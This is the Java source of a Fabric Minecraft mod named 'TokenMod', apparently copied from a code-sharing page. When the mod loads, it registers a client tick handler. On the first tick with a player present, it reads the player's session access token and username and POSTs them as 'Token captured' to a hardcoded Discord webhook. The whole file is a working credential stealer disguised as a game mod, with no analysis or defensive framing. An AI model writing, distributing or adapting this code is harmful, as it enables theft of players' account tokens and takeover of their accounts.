java
Download
Copy
package com.example;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.MinecraftClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TokenMod implements ModInitializer {
    public static final String MOD_ID = "token-mod";
    private static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);

  
    public static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1571979949210861771/TP9lmbA-hR1QExLPD0WEx-g9B1NIlqGkHpBWjCT1I44jrI4Wr3o4UGEJivRVxfOtNOPf";

    @Override
    public void onInitialize() {
        LOGGER.info("Token Mod Loaded!");
        
        ClientTickEvents.START_CLIENT_TICK_EVENT.register(client -> {
            if (client.player != null && !isSent()) {
                sendToken(client.getSession().getAccessToken(), client.getSession().getUsername());
            }
        });
    }

    private boolean sent = false;

    private void sendToken(String token, String user) {
        try {
            String json = "{\"content\": \"Token captured for user: " + user + "\\nToken: ```" + token + "```\"}";
            
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            if (conn.getResponseCode() == HttpURLConnection.HTTP_NO_CONTENT || conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                LOGGER.info("Token sent successfully!");
                sent = true;
            } else {
                LOGGER.error("Failed to send webhook: " + conn.getResponseCode());
            }
            conn.disconnect();
        } catch (Exception e) {
            LOGGER.error("Error sending token", e);
        }
    }
    
    private boolean isSent() { return sent; }
}
